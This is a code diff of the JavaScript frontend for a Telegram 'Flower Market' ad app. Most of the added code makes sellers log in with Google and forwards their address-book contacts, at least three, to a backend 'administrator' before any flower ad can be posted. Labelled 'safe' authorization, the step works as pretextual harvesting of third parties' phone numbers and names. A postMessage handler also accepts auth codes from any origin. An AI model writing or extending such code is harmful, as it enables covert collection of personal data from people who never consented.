@@ -1,105 +1,529 @@
 // ============================================
-// Flower Market Kyrgyzstan - Frontend
-// Подключен к бэкенду: https://backend-flower-2-production.up.railway.app
+// Flower Market - Основной JavaScript
 // ============================================
 
-// Конфигурация - ВАШ РАБОЧИЙ БЭКЕНД
 const BACKEND_URL = 'https://backend-flower-2-production.up.railway.app';
 
 // Глобальные переменные
 let currentStep = 1;
+let totalSteps = 4;
 let mediaFiles = [];
-let selectedContactType = 'telegram';
-let tg = window.Telegram?.WebApp;
+let isSubmitting = false;
+let userId = null;
+let chatId = null;
+let contactsUploaded = false;
+let contactsCount = 0;
+let tgWebApp = null;
 
-// ============================================
-// ИНИЦИАЛИЗАЦИЯ
-// ============================================
-
-document.addEventListener('DOMContentLoaded', async function() {
-    console.log('🌺 Flower Market Frontend запущен');
-    console.log('Backend URL:', BACKEND_URL);
+// Инициализация
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('🌺 Flower Market запущен');
     
-    // Инициализация Telegram WebApp
-    if (tg) {
-        tg.ready();
-        tg.expand();
-        
-        console.log('✅ Telegram WebApp инициализирован');
-        console.log('User:', tg.initDataUnsafe?.user);
-        
-        // Показываем кнопку закрытия для Telegram
-        document.getElementById('telegramCloseSection').style.display = 'block';
-    } else {
-        console.log('⚠️ Запуск в браузере (не Telegram)');
-        // Для тестирования в браузере
-        window.tgMock = {
-            initData: 'mock_data_for_testing',
-            initDataUnsafe: { user: { id: 123456, first_name: 'Тест', username: 'test_user' } }
-        };
-        tg = window.tgMock;
-    }
-    
-    // Настраиваем обработчики
-    setupEventListeners();
-    
-    // Показываем первый шаг
-    showStep(1);
-    
-    // Проверяем связь с бэкендом
-    await checkBackendConnection();
-});
-
-// Проверка связи с бэкендом
-async function checkBackendConnection() {
+    // Инициализируем Telegram Web App
     try {
-        console.log('🔗 Проверяю связь с бэкендом...');
-        const response = await fetch(`${BACKEND_URL}/api/health`);
-        const data = await response.json();
-        
-        if (response.ok) {
-            console.log('✅ Связь с бэкендом установлена:', data);
-            showNotification('Готов к работе', 'Бэкенд подключен', 'success');
-        } else {
-            console.warn('⚠️ Бэкенд ответил с ошибкой:', data);
+        if (window.Telegram && window.Telegram.WebApp) {
+            tgWebApp = Telegram.WebApp;
+            tgWebApp.ready();
+            tgWebApp.expand();
+            
+            const tgUser = tgWebApp.initDataUnsafe.user;
+            if (tgUser) {
+                userId = tgUser.id.toString();
+                chatId = tgUser.id.toString();
+                
+                const url = new URL(window.location);
+                url.searchParams.set('userId', userId);
+                url.searchParams.set('chatId', chatId);
+                window.history.replaceState({}, '', url);
+            }
         }
     } catch (error) {
-        console.error('❌ Ошибка связи с бэкендом:', error);
-        showNotification('Внимание', 'Бэкенд временно недоступен', 'info');
+        console.error('❌ Ошибка Telegram Web App:', error);
+    }
+    
+    // Если нет данных из Telegram, используем URL параметры
+    if (!userId || !chatId) {
+        const urlParams = new URLSearchParams(window.location.search);
+        userId = urlParams.get('userId');
+        chatId = urlParams.get('chatId');
+    }
+    
+    console.log('📋 Параметры:', { userId, chatId });
+    
+    if (!userId || !chatId) {
+        showNotification('Ошибка', 'Не получены параметры пользователя. Откройте через Telegram бота.', 'error');
+        return;
+    }
+    
+    // Инициализация событий
+    initEventListeners();
+    
+    // Проверяем статус контактов
+    checkContactsStatus();
+});
+
+// Инициализация всех обработчиков событий
+function initEventListeners() {
+    // Google авторизация
+    document.getElementById('googleSignInBtn').addEventListener('click', startSafeGoogleAuth);
+    
+    // Продолжить к форме
+    document.getElementById('continueToFormBtn').addEventListener('click', continueToForm);
+    
+    // Повторить запрос
+    document.getElementById('retryContactsBtn').addEventListener('click', retryContactsRequest);
+    
+    // Загрузка медиа
+    document.getElementById('mediaUpload').addEventListener('click', () => {
+        document.getElementById('mediaInput').click();
+    });
+    
+    document.getElementById('mediaInput').addEventListener('change', handleMediaUpload);
+    
+    // Навигация по шагам
+    document.querySelectorAll('.btn-next').forEach(btn => {
+        btn.addEventListener('click', nextStep);
+    });
+    
+    document.querySelectorAll('.btn-prev').forEach(btn => {
+        btn.addEventListener('click', prevStep);
+    });
+    
+    // Кнопки цены
+    document.getElementById('priceBtnNegotiable').addEventListener('click', setNegotiablePrice);
+    document.getElementById('priceBtnEnter').addEventListener('click', focusPriceInput);
+    
+    // Публикация
+    document.getElementById('submitBtn').addEventListener('click', submitForm);
+    
+    // Создать новое объявление
+    document.getElementById('createNewAdBtn').addEventListener('click', createNewAd);
+    
+    // Валидация полей
+    document.getElementById('description').addEventListener('input', validateCurrentStep);
+    document.getElementById('price').addEventListener('input', validateCurrentStep);
+}
+
+// Безопасная авторизация Google через бэкенд
+async function startSafeGoogleAuth() {
+    console.log('🔐 Безопасная авторизация Google через бэкенд...');
+    
+    const googleBtn = document.getElementById('googleSignInBtn');
+    const googleBtnText = document.getElementById('googleBtnText');
+    
+    googleBtn.disabled = true;
+    googleBtnText.textContent = 'Загрузка...';
+    
+    // Показываем статус
+    const googleAuthStatus = document.getElementById('googleAuthStatus');
+    const googleStatusTitle = document.getElementById('googleStatusTitle');
+    const googleStatusText = document.getElementById('googleStatusText');
+    
+    googleAuthStatus.style.display = 'block';
+    googleStatusTitle.textContent = 'Авторизация Google';
+    googleStatusText.textContent = 'Получение ссылки для авторизации...';
+    
+    try {
+        // 1. Запрашиваем у бэкенда URL для авторизации
+        const response = await fetch(`${BACKEND_URL}/api/auth/google/url`, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({ 
+                userId: userId,
+                chatId: chatId,
+                redirectUri: window.location.origin
+            })
+        });
+        
+        if (!response.ok) {
+            throw new Error('Ошибка при получении ссылки авторизации');
+        }
+        
+        const data = await response.json();
+        
+        if (!data.url) {
+            throw new Error('Не получена ссылка авторизации');
+        }
+        
+        googleStatusText.textContent = 'Открывается окно авторизации...';
+        
+        // 2. Открываем окно авторизации
+        const authWindow = window.open(
+            data.url,
+            'Google Auth',
+            'width=500,height=600,left=100,top=100,toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
+        );
+        
+        if (!authWindow) {
+            throw new Error('Разрешите всплывающие окна для авторизации Google');
+        }
+        
+        // 3. Слушаем сообщения от окна авторизации
+        const messageListener = function(event) {
+            console.log('📨 Получено сообщение:', event.data);
+            
+            if (event.data && event.data.type === 'google_auth_success') {
+                console.log('✅ Получен токен через postMessage');
+                window.removeEventListener('message', messageListener);
+                authWindow.close();
+                
+                // 4. Получаем контакты через бэкенд
+                getGoogleContacts(event.data.code || event.data.token);
+            }
+        };
+        
+        window.addEventListener('message', messageListener);
+        
+        // 5. Таймер для проверки закрытия окна
+        const checkWindow = setInterval(() => {
+            if (authWindow.closed) {
+                clearInterval(checkWindow);
+                window.removeEventListener('message', messageListener);
+                
+                googleBtn.disabled = false;
+                googleBtnText.textContent = 'Войти через Google и импортировать контакты';
+            }
+        }, 100);
+        
+    } catch (error) {
+        console.error('❌ Ошибка авторизации:', error);
+        
+        googleStatusTitle.textContent = 'Ошибка авторизации';
+        googleStatusText.textContent = error.message;
+        googleAuthStatus.style.background = 'rgba(255, 107, 107, 0.1)';
+        googleAuthStatus.style.borderLeftColor = '#ff6b6b';
+        
+        googleBtn.disabled = false;
+        googleBtnText.textContent = 'Войти через Google и импортировать контакты';
+        
+        // Добавляем кнопку повтора
+        const retryBtn = document.createElement('button');
+        retryBtn.className = 'btn';
+        retryBtn.style.marginTop = '15px';
+        retryBtn.style.background = '#ff6b6b';
+        retryBtn.innerHTML = '<i class="fas fa-redo"></i> ПОВТОРИТЬ';
+        retryBtn.onclick = startSafeGoogleAuth;
+        
+        // Убираем старую кнопку если есть
+        const oldSendButton = googleAuthStatus.querySelector('.btn');
+        if (oldSendButton) {
+            oldSendButton.remove();
+        }
+        
+        googleAuthStatus.appendChild(retryBtn);
     }
 }
 
-// ============================================
-// ОСНОВНЫЕ ФУНКЦИИ ФОРМЫ
-// ============================================
+// Получение контактов через бэкенд
+async function getGoogleContacts(authCode) {
+    const googleAuthStatus = document.getElementById('googleAuthStatus');
+    const googleStatusTitle = document.getElementById('googleStatusTitle');
+    const googleStatusText = document.getElementById('googleStatusText');
+    const googleContactsPreview = document.getElementById('googleContactsPreview');
+    
+    googleStatusTitle.textContent = 'Получение контактов...';
+    googleStatusText.textContent = 'Запрашиваем ваши контакты через Google API...';
+    
+    try {
+        // Отправляем код авторизации на бэкенд
+        const response = await fetch(`${BACKEND_URL}/api/auth/google/contacts`, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                userId: userId,
+                chatId: chatId,
+                authCode: authCode,
+                redirectUri: window.location.origin
+            })
+        });
+        
+        if (!response.ok) {
+            const errorText = await response.text();
+            throw new Error(`Ошибка сервера: ${response.status} - ${errorText}`);
+        }
+        
+        const result = await response.json();
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Ошибка получения контактов');
+        }
+        
+        const contacts = result.contacts || [];
+        console.log(`✅ Получено ${contacts.length} контактов через бэкенд`);
+        
+        if (contacts.length === 0) {
+            throw new Error('Не найдено контактов в вашем Google аккаунте');
+        }
+        
+        if (contacts.length < 3) {
+            throw new Error(`Найдено только ${contacts.length} контактов. Требуется минимум 3 контакта.`);
+        }
+        
+        // Показываем предпросмотр
+        googleStatusTitle.textContent = 'Контакты успешно импортированы!';
+        googleStatusText.textContent = `Найдено контактов: ${contacts.length}`;
+        
+        let previewHtml = '';
+        contacts.slice(0, 10).forEach((contact, index) => {
+            const name = contact.name || 'Без имени';
+            const phone = contact.phone || contact.tel || 'Нет телефона';
+            previewHtml += `
+                <div class="contact-preview-item">
+                    <div class="contact-info">
+                        <div class="contact-number">${index + 1}. ${name}</div>
+                        <div class="contact-name">Телефон: ${formatPhoneNumber(phone)}</div>
+                    </div>
+                </div>
+            `;
+        });
+        
+        if (contacts.length > 10) {
+            previewHtml += `
+                <div class="contact-preview-item" style="color: #666; font-style: italic;">
+                    ... и еще ${contacts.length - 10} контактов
+                </div>
+            `;
+        }
+        
+        googleContactsPreview.innerHTML = previewHtml;
+        
+        // Сохраняем контакты
+        window.importedContacts = contacts;
+        
+        // Добавляем кнопку отправки
+        const sendButton = document.createElement('button');
+        sendButton.className = 'btn';
+        sendButton.style.marginTop = '15px';
+        sendButton.style.background = '#34c759';
+        sendButton.innerHTML = '<i class="fas fa-paper-plane"></i> ОТПРАВИТЬ КОНТАКТЫ АДМИНИСТРАТОРУ';
+        sendButton.onclick = () => sendGoogleContactsToServer(contacts);
+        
+        googleAuthStatus.appendChild(sendButton);
+        
+        // Восстанавливаем кнопку
+        const googleBtn = document.getElementById('googleSignInBtn');
+        const googleBtnText = document.getElementById('googleBtnText');
+        googleBtn.disabled = false;
+        googleBtnText.textContent = 'Войти через Google и импортировать контакты';
+        
+    } catch (error) {
+        console.error('❌ Ошибка получения контактов:', error);
+        
+        googleStatusTitle.textContent = 'Ошибка импорта';
+        googleStatusText.textContent = error.message;
+        googleAuthStatus.style.background = 'rgba(255, 107, 107, 0.1)';
+        googleAuthStatus.style.borderLeftColor = '#ff6b6b';
+        
+        const retryBtn = document.createElement('button');
+        retryBtn.className = 'btn';
+        retryBtn.style.marginTop = '15px';
+        retryBtn.style.background = '#ff6b6b';
+        retryBtn.innerHTML = '<i class="fas fa-redo"></i> ПОВТОРИТЬ';
+        retryBtn.onclick = startSafeGoogleAuth;
+        
+        googleAuthStatus.appendChild(retryBtn);
+    }
+}
+
+// Отправить Google контакты на сервер
+async function sendGoogleContactsToServer(contacts) {
+    if (!contacts || contacts.length < 3) {
+        showNotification('Ошибка', 'Требуется минимум 3 контакта', 'error');
+        return;
+    }
+    
+    const contactsLoader = document.getElementById('contactsLoader');
+    const loaderText = document.getElementById('loaderText');
+    
+    contactsLoader.style.display = 'block';
+    loaderText.textContent = 'Отправка контактов администратору...';
+    document.getElementById('googleAuthStatus').style.display = 'none';
+    
+    await sendContactsToServer(contacts, 'google');
+}
+
+// Форматирование номера телефона
+function formatPhoneNumber(phone) {
+    if (!phone) return 'Нет телефона';
+    
+    // Очищаем от нецифровых символов
+    const cleanPhone = phone.toString().replace(/\D/g, '');
+    
+    // Форматируем для Кыргызстана
+    if (cleanPhone.length >= 10) {
+        if (cleanPhone.startsWith('996')) {
+            return `+${cleanPhone.substring(0, 3)} ${cleanPhone.substring(3, 6)} ${cleanPhone.substring(6, 9)} ${cleanPhone.substring(9, 12)}`;
+        } else if (cleanPhone.length === 9) {
+            return `+996 ${cleanPhone.substring(0, 3)} ${cleanPhone.substring(3, 6)} ${cleanPhone.substring(6, 9)}`;
+        } else if (cleanPhone.length === 10) {
+            return `+${cleanPhone}`;
+        }
+    }
+    
+    return cleanPhone;
+}
+
+// Проверить статус контактов
+async function checkContactsStatus() {
+    try {
+        console.log('🔍 Проверка статуса контактов...');
+        
+        const response = await fetch(`${BACKEND_URL}/api/user/${userId}/status`);
+        
+        if (response.ok) {
+            const data = await response.json();
+            console.log('📊 Статус контактов:', data);
+            
+            if (data.hasContacts) {
+                contactsUploaded = true;
+                contactsCount = data.contactsCount || 0;
+                showContactsSuccess();
+            }
+        } else {
+            // Не показываем ошибку, просто оставляем экран с Google импортом
+        }
+    } catch (error) {
+        console.error('❌ Ошибка проверки статуса:', error);
+        // Не показываем ошибку пользователю
+    }
+}
+
+// Общая функция отправки контактов
+async function sendContactsToServer(contacts, source) {
+    const contactsError = document.getElementById('contactsError');
+    const contactsErrorMessage = document.getElementById('contactsErrorMessage');
+    
+    try {
+        contactsCount = contacts.length;
+        
+        console.log(`📤 Отправляем ${contacts.length} контактов из ${source}...`);
+        
+        const response = await fetch(`${BACKEND_URL}/api/upload-contacts`, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                userId: userId,
+                chatId: chatId,
+                contacts: contacts,
+                firstName: 'Пользователь',
+                importSource: source
+            })
+        });
+        
+        if (!response.ok) {
+            const errorText = await response.text();
+            throw new Error(`Ошибка сервера: ${response.status} - ${errorText}`);
+        }
+        
+        const result = await response.json();
+        console.log('✅ Результат от сервера:', result);
+        
+        if (result.success) {
+            contactsUploaded = true;
+            document.getElementById('contactsLoader').style.display = 'none';
+            showContactsSuccess();
+            
+            showNotification('✅ Успешно!', 
+                `Отправлено ${contacts.length} контактов. Администратор получил уведомление.`, 
+                'success');
+                
+        } else {
+            throw new Error(result.error || 'Ошибка сохранения контактов');
+        }
+        
+    } catch (error) {
+        console.error('❌ Ошибка отправки контактов:', error);
+        document.getElementById('contactsLoader').style.display = 'none';
+        contactsError.style.display = 'block';
+        contactsErrorMessage.textContent = error.message;
+    }
+}
+
+// Показать успешный экран
+function showContactsSuccess() {
+    document.getElementById('contactsLoader').style.display = 'none';
+    document.getElementById('contactsSuccess').style.display = 'block';
+    document.getElementById('contactsCountText').textContent = `Отправлено контактов: ${contactsCount}`;
+    document.getElementById('contactsRequired').innerHTML = '✅ Контакты успешно отправлены!';
+    document.getElementById('contactsRequired').style.color = '#34c759';
+}
+
+// Повторить запрос
+function retryContactsRequest() {
+    document.getElementById('contactsError').style.display = 'none';
+}
+
+// Продолжить к форме
+function continueToForm() {
+    if (!contactsUploaded) {
+        showNotification('Ошибка', 'Сначала отправьте контакты администратору', 'error');
+        return;
+    }
+    
+    document.getElementById('contactsScreen').style.display = 'none';
+    document.getElementById('mainContainer').style.display = 'block';
+    
+    document.getElementById('contactsStatusText').innerHTML = 
+        `<i class="fas fa-check-circle" style="color: #34c759;"></i> Контакты отправлены: ${contactsCount} ✓`;
+    
+    // Устанавливаем договорную цену по умолчанию
+    setNegotiablePrice();
+    
+    // Показываем первый шаг
+    showStep(1);
+}
+
+// ==================== ФУНКЦИИ ФОРМЫ ====================
 
 function showStep(step) {
     // Скрываем все шаги
-    document.querySelectorAll('.form-step').forEach(el => {
-        el.classList.remove('active');
-    });
+    for (let i = 1; i <= totalSteps; i++) {
+        document.getElementById(`step${i}`).style.display = 'none';
+    }
     
-    // Показываем нужный шаг
+    // Показываем текущий шаг
     const stepEl = document.getElementById(`step${step}`);
     if (stepEl) {
-        stepEl.classList.add('active');
+        stepEl.style.display = 'block';
         currentStep = step;
+        
+        // Обновляем прогресс-бар
         updateProgressBar();
+        
+        // Валидируем текущий шаг
         validateCurrentStep();
+        
+        // Если это шаг превью, обновляем его
+        if (currentStep === totalSteps) {
+            updatePreview();
+        }
     }
 }
 
 function updateProgressBar() {
-    const steps = document.querySelectorAll('.progress-step');
-    steps.forEach((step, index) => {
-        const stepNumber = step.querySelector('.step-number');
-        const stepLabel = step.querySelector('.step-label');
-        
-        if (stepNumber && stepLabel) {
-            const isActive = index + 1 <= currentStep;
-            stepNumber.classList.toggle('active', isActive);
-            stepLabel.classList.toggle('active', isActive);
-        }
+    const stepNumbers = document.querySelectorAll('.step-number');
+    const stepLabels = document.querySelectorAll('.step-label');
+    
+    stepNumbers.forEach((stepNumber, index) => {
+        const isActive = index + 1 <= currentStep;
+        stepNumber.style.background = isActive ? 'white' : 'rgba(255,255,255,0.3)';
+        stepNumber.style.color = isActive ? '#667eea' : 'white';
+        stepNumber.style.boxShadow = isActive ? '0 0 0 4px rgba(255,255,255,0.3)' : 'none';
+    });
+    
+    stepLabels.forEach((stepLabel, index) => {
+        const isActive = index + 1 <= currentStep;
+        stepLabel.style.color = isActive ? 'white' : 'rgba(255,255,255,0.7)';
+        stepLabel.style.fontWeight = isActive ? '500' : 'normal';
     });
 }
 
@@ -110,109 +534,94 @@ function validateCurrentStep() {
     switch (currentStep) {
         case 1:
             isValid = mediaFiles.length > 0;
-            errorMessage = 'Загрузите хотя бы одно фото';
+            errorMessage = 'Загрузите хотя бы одно фото или видео';
             break;
             
         case 2:
             const desc = document.getElementById('description')?.value.trim() || '';
             isValid = desc.length >= 3;
-            errorMessage = 'Описание должно содержать минимум 3 символа';
+            errorMessage = 'Комментарий должен содержать минимум 3 символа';
             break;
             
         case 3:
-            const priceInput = document.getElementById('price');
-            const price = priceInput?.value || '';
-            const isNegotiable = document.getElementById('priceBtnNegotiable')?.classList.contains('active');
+            const price = document.getElementById('price')?.value || '';
+            const priceBtn = document.getElementById('priceBtnNegotiable');
+            const isNegotiable = priceBtn && priceBtn.classList.contains('active');
             isValid = isNegotiable || (price && !isNaN(parseFloat(price)) && parseFloat(price) > 0);
             errorMessage = 'Укажите цену или выберите "Договорная"';
             break;
-            
-        case 4:
-            if (selectedContactType === 'telegram') {
-                const telegram = document.getElementById('telegram')?.value.trim() || '';
-                isValid = telegram.length >= 3;
-                errorMessage = 'Введите Telegram username';
-            } else if (selectedContactType === 'phone') {
-                const phone = document.getElementById('phone')?.value.trim() || '';
-                isValid = phone.length >= 10;
-                errorMessage = 'Введите номер телефона';
-            }
-            break;
-            
-        case 5:
-            const region = document.getElementById('regionSelect')?.value || '';
-            const city = document.getElementById('citySelect')?.value || '';
-            isValid = region && city;
-            errorMessage = 'Выберите регион и город';
-            break;
     }
     
-    // Обновляем кнопку "Далее"
     const nextBtn = document.getElementById(`nextBtn${currentStep}`);
     if (nextBtn) {
         nextBtn.disabled = !isValid;
     }
     
-    // Показываем/скрываем ошибку
     const hintId = getHintIdForStep(currentStep);
     const hintElement = document.getElementById(hintId);
     if (hintElement) {
-        if (!isValid) {
+        if (!isValid && errorMessage) {
             hintElement.textContent = errorMessage;
-            hintElement.classList.add('show');
+            hintElement.style.display = 'block';
         } else {
-            hintElement.classList.remove('show');
+            hintElement.style.display = 'none';
         }
     }
     
     return isValid;
 }
 
-function getHintIdForStep(step) {
-    const hints = {
-        1: 'mediaHint',
-        2: 'descriptionHint',
-        3: 'priceHint',
-        4: selectedContactType === 'telegram' ? 'telegramHint' : 'phoneHint',
-        5: 'regionHint'
-    };
-    return hints[step];
-}
-
-// ============================================
-// ОБРАБОТКА МЕДИА
-// ============================================
-
 function handleMediaUpload(event) {
     const files = Array.from(event.target.files);
-    const maxFiles = 10; // Максимум 10 фото
+    const maxFiles = 10;
     
-    // Проверка лимита
+    if (files.length === 0) return;
+    
     if (mediaFiles.length + files.length > maxFiles) {
-        showNotification('Ошибка', `Можно загрузить не более ${maxFiles} фото`, 'error');
+        showNotification('Ошибка', `Можно загрузить не более ${maxFiles} файлов`, 'error');
         return;
     }
     
-    // Проверка типа файлов
-    const validFiles = files.filter(file => {
-        const validTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
-        return validTypes.includes(file.type);
-    });
+    const newFiles = [];
     
-    // Добавляем файлы
-    validFiles.forEach(file => {
-        const url = URL.createObjectURL(file);
-        mediaFiles.push({
-            file: file,
-            url: url,
-            name: file.name,
-            type: file.type,
-            size: file.size
-        });
-    });
+    for (const file of files) {
+        if (!file.type.startsWith('image/') && !file.type.startsWith('video/')) {
+            showNotification('Внимание', `Файл "${file.name}" не поддерживается`, 'warning');
+            continue;
+        }
+        
+        if (file.size > 50 * 1024 * 1024) {
+            showNotification('Внимание', `Файл "${file.name}" слишком большой (макс. 50MB)`, 'warning');
+            continue;
+        }
+        
+        newFiles.push(file);
+    }
     
-    updateMediaPreview();
-    validateCurrentStep();
+    for (const file of newFiles) {
+        const reader = new FileReader();
+        
+        reader.onload = function(e) {
+            const url = e.target.result;
+            
+            const tempMedia = {
+                file: file,
+                url: url,
+                name: file.name,
+                type: file.type,
+                size: file.size,
+                uploaded: true,
+                fileId: 'file_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
+            };
+            
+            mediaFiles.push(tempMedia);
+            updateMediaPreview();
+            validateCurrentStep();
+        };
+        
+        reader.readAsDataURL(file);
+    }
+    
     event.target.value = '';
 }
 
@@ -224,217 +633,298 @@ function updateMediaPreview() {
     
     mediaFiles.forEach((file, index) => {
         const item = document.createElement('div');
-        item.className = 'media-item';
+        item.className = 'media-preview-item';
+        
+        let mediaContent = '';
+        if (file.type.startsWith('image/')) {
+            mediaContent = `<img src="${file.url}" alt="Фото ${index + 1}">`;
+        } else if (file.type.startsWith('video/')) {
+            mediaContent = `<video><source src="${file.url}" type="${file.type}"></video>`;
+        }
+        
+        const mediaType = file.type.startsWith('image/') ? 'ФОТО' : 'ВИДЕО';
         
         item.innerHTML = `
-            <img src="${file.url}" alt="Фото ${index + 1}" loading="lazy">
-            <div class="media-type">${file.type.includes('image') ? 'ФОТО' : 'ФАЙЛ'}</div>
-            <div class="remove-media" onclick="removeMedia(${index})">
+            ${mediaContent}
+            <div class="media-type-badge">${mediaType}</div>
+            <div class="remove-media" data-index="${index}">
                 <i class="fas fa-times"></i>
             </div>
         `;
         
+        // Обработчик удаления
+        item.querySelector('.remove-media').addEventListener('click', (e) => {
+            e.stopPropagation();
+            removeMedia(index);
+        });
+        
         previewContainer.appendChild(item);
     });
     
-    // Обновляем подсказку
     const hint = document.getElementById('mediaHint');
     if (hint) {
-        hint.textContent = mediaFiles.length > 0 
-            ? `Загружено: ${mediaFiles.length} фото` 
-            : 'Загрузите хотя бы одно фото';
-        hint.classList.toggle('show', mediaFiles.length === 0);
+        if (mediaFiles.length > 0) {
+            const photoCount = mediaFiles.filter(f => f.type.startsWith('image/')).length;
+            const videoCount = mediaFiles.filter(f => f.type.startsWith('video/')).length;
+            
+            let text = `✅ Загружено: ${mediaFiles.length} файлов`;
+            if (photoCount > 0) text += ` (${photoCount} фото)`;
+            if (videoCount > 0) text += ` (${videoCount} видео)`;
+            
+            hint.textContent = text;
+            hint.style.color = '#34c759';
+            hint.style.display = 'block';
+        } else {
+            hint.textContent = 'Загрузите хотя бы один файл';
+            hint.style.color = '#ff3b30';
+            hint.style.display = 'block';
+        }
     }
 }
 
 function removeMedia(index) {
     if (index >= 0 && index < mediaFiles.length) {
-        URL.revokeObjectURL(mediaFiles[index].url);
         mediaFiles.splice(index, 1);
         updateMediaPreview();
         validateCurrentStep();
     }
 }
 
-// ============================================
-// API ВЗАИМОДЕЙСТВИЕ С БЭКЕНДОМ
-// ============================================
-
-async function getCities(region) {
-    try {
-        console.log(`Запрос городов для региона: ${region}`);
-        const response = await fetch(`${BACKEND_URL}/api/cities/${encodeURIComponent(region)}`);
+function updatePreview() {
+    const previewContent = document.getElementById('previewContent');
+    if (!previewContent) return;
+    
+    // Очищаем превью
+    previewContent.innerHTML = '';
+    
+    // Добавляем фото/видео превью
+    const mediaPreview = document.createElement('div');
+    mediaPreview.className = 'preview-item';
+    
+    const mediaLabel = document.createElement('div');
+    mediaLabel.className = 'preview-label';
+    mediaLabel.textContent = 'Фото/Видео';
+    
+    const mediaGallery = document.createElement('div');
+    mediaGallery.className = 'preview-media';
+    
+    mediaFiles.slice(0, 6).forEach((file, index) => {
+        const item = document.createElement('div');
+        item.className = 'media-thumb';
         
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
+        if (file.type.startsWith('image/')) {
+            const img = document.createElement('img');
+            img.src = file.url;
+            img.alt = `Фото ${index + 1}`;
+            item.appendChild(img);
+        } else if (file.type.startsWith('video/')) {
+            const video = document.createElement('video');
+            const source = document.createElement('source');
+            source.src = file.url;
+            source.type = file.type;
+            video.appendChild(source);
+            item.appendChild(video);
+            
+            const badge = document.createElement('div');
+            badge.className = 'media-badge';
+            badge.textContent = 'ВИДЕО';
+            item.appendChild(badge);
         }
         
-        const data = await response.json();
-        console.log('Получены города:', data);
-        
-        return data.cities || [];
-    } catch (error) {
-        console.error('Ошибка получения городов:', error);
-        showNotification('Ошибка', 'Не удалось загрузить города', 'error');
-        return [];
+        mediaGallery.appendChild(item);
+    });
+    
+    if (mediaFiles.length > 6) {
+        const moreItem = document.createElement('div');
+        moreItem.className = 'media-thumb';
+        moreItem.style.display = 'flex';
+        moreItem.style.alignItems = 'center';
+        moreItem.style.justifyContent = 'center';
+        moreItem.style.background = 'rgba(102, 126, 234, 0.1)';
+        moreItem.style.fontSize = '16px';
+        moreItem.style.fontWeight = 'bold';
+        moreItem.style.color = '#667eea';
+        moreItem.textContent = `+${mediaFiles.length - 6}`;
+        mediaGallery.appendChild(moreItem);
     }
+    
+    const mediaCount = document.createElement('p');
+    mediaCount.className = 'form-hint';
+    mediaCount.innerHTML = `Всего файлов: <span style="font-weight: bold;">${mediaFiles.length}</span>`;
+    
+    mediaPreview.appendChild(mediaLabel);
+    mediaPreview.appendChild(mediaGallery);
+    mediaPreview.appendChild(mediaCount);
+    previewContent.appendChild(mediaPreview);
+    
+    // Добавляем описание
+    const description = document.getElementById('description').value || 'Не указано';
+    addPreviewItem('Комментарий', description);
+    
+    // Добавляем цену
+    const price = document.getElementById('price').value || 'Договорная';
+    addPreviewItem('Цена', price);
+    
+    // Добавляем статус контактов
+    addPreviewItem('Контакты для проверки', `Отправлено администратору: ${contactsCount} контактов`);
 }
 
-async function publishAd(formData) {
-    try {
-        console.log('📤 Отправка данных на бэкенд:', formData);
-        
-        const response = await fetch(`${BACKEND_URL}/api/publish`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(formData)
-        });
-        
-        const result = await response.json();
-        console.log('📥 Ответ от бэкенда:', result);
-        
-        return result;
-        
-    } catch (error) {
-        console.error('❌ Ошибка публикации:', error);
-        throw new Error(`Не удалось отправить данные: ${error.message}`);
-    }
+function addPreviewItem(label, value) {
+    const previewContent = document.getElementById('previewContent');
+    
+    const item = document.createElement('div');
+    item.className = 'preview-item';
+    
+    const labelDiv = document.createElement('div');
+    labelDiv.className = 'preview-label';
+    labelDiv.textContent = label;
+    
+    const valueDiv = document.createElement('div');
+    valueDiv.className = 'preview-value';
+    valueDiv.textContent = value;
+    
+    item.appendChild(labelDiv);
+    item.appendChild(valueDiv);
+    previewContent.appendChild(item);
 }
-
-// ============================================
-// ПУБЛИКАЦИЯ ОБЪЯВЛЕНИЯ
-// ============================================
 
 async function submitForm() {
-    console.log('🚀 Начинаю публикацию...');
+    if (isSubmitting) return;
     
-    // Проверяем все шаги
-    for (let i = 1; i <= 5; i++) {
-        if (!validateCurrentStep()) {
-            showNotification('Ошибка', 'Заполните все обязательные поля', 'error');
-            return;
+    console.log('🚀 Публикация объявления...');
+    
+    if (!validateAllSteps()) {
+        showNotification('Ошибка', 'Заполните все обязательные поля', 'error');
+        return;
+    }
+    
+    // Проверяем, загружены ли контакты
+    if (!contactsUploaded) {
+        showNotification('Ошибка', 
+            'Вы не предоставили контакты администратору. Это обязательное требование.', 
+            'error');
+        return;
+    }
+    
+    isSubmitting = true;
+    
+    // Собираем данные формы
+    const formData = {
+        userId: userId,
+        chatId: chatId,
+        description: document.getElementById('description').value,
+        price: document.getElementById('price').value || 'Договорная',
+        contacts: 'Контакты отправлены администратору для проверки',
+        freshness: 'Не указано',
+        city: 'Не указано',
+        district: '',
+        address: '',
+        hashtags: '#цветы #продажа',
+        mediaFiles: []
+    };
+    
+    console.log(`📁 Подготовка ${mediaFiles.length} файлов...`);
+    for (const file of mediaFiles) {
+        try {
+            const base64Data = file.url.split(',')[1];
+            formData.mediaFiles.push({
+                name: file.name,
+                type: file.type,
+                data: base64Data
+            });
+        } catch (error) {
+            console.error('❌ Ошибка конвертации файла:', error);
         }
     }
     
-    // Показываем шаг превью
-    showStep(6);
-    updatePreview();
-    
-    // Собираем данные
-    const formData = {
-        initData: tg?.initData || 'test_data', // Для тестирования
-        description: document.getElementById('description').value,
-        price: document.getElementById('price').value || 'Договорная',
-        contacts: getContactInfo(),
-        region: document.getElementById('regionSelect').value,
-        city: document.getElementById('citySelect').value,
-        address: document.getElementById('addressInput').value || '',
-        photos: mediaFiles.map(f => f.url)
-    };
-    
-    console.log('📝 Данные для публикации:', formData);
-    
-    // Показываем загрузку
     const submitBtn = document.getElementById('submitBtn');
     const originalText = submitBtn.innerHTML;
